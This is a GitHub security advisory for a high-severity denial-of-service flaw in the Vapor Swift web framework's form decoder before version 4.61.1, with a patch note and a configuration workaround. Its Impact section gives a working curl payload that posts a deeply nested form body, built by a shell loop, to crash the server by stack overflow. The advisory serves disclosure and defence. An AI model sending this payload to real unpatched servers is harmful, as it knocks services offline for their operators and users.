# [H] Vapor vulnerable to denial of service in URLEncodedFormDecoder

## Summary
Severity: High
Advisory: GHSA-qvxg-wjxc-r4gg
CVE: CVE-2022-31019
CWE: CWE-120, CWE-121, CWE-674
Ecosystem: SwiftURL
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-06-07
Source: https://github.com/advisories/GHSA-qvxg-wjxc-r4gg
Type: github-advisory

## Affected
- SwiftURL: `github.com/vapor/vapor` — affected >=0 <4.61.1

## Details
Vapor is an HTTP web framework for Swift. Vapor versions earlier than 4.61.1 are vulnerable to a denial of service in the URLEncodedFormDecoder.

### Impact
When using automatic content decoding, e.g. 

```swift
app.post("foo") { request -> String in
  let foo = try request.content.decode(Foo.self)
  return "\(foo)"
}
```

An attacker can craft a request body that can make the server crash with the following request:

```
curl -d "array[_0][0][array][_0][0][array]$(for f in $(seq 1100); do echo -n '[_0][0][array]'; done)[string][_0]=hello%20world" http://localhost:8080/foo
```

The issue is unbounded, attacker controlled stack growth which will at some point lead to a stack overflow.

### Patches
Fixed in 4.61.1

### Workarounds
If you don't need to decode Form URL Encoded data, you can disable the `ContentConfiguration` so it won't be used. E.g. in **configure.swift**

```swift
var contentConfig = ContentConfiguration()
contentConfig.use(encoder: JSONEncoder.custom(dates: .iso8601), for: .json)
contentConfig.use(decoder: JSONDecoder.custom(dates: .iso8601), for: .json)
contentConfig.use(encoder: JSONEncoder.custom(dates: .iso8601), for: .jsonAPI)
contentConfig.use(decoder: JSONDecoder.custom(dates: .iso8601), for: .jsonAPI)
ContentConfiguration.global = contentConfig
```

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the Vapor repo](https://github.com/vapor/vapor)
* Ask in [Vapor Discord](http://vapor.team)

## References
- https://github.com/vapor/vapor/security/advisories/GHSA-qvxg-wjxc-r4gg
- https://nvd.nist.gov/vuln/detail/CVE-2022-31019
- https://github.com/vapor/vapor/commit/6c63226a4ab82ce53730eb1afb9ca63866fcf033
- https://github.com/vapor/vapor
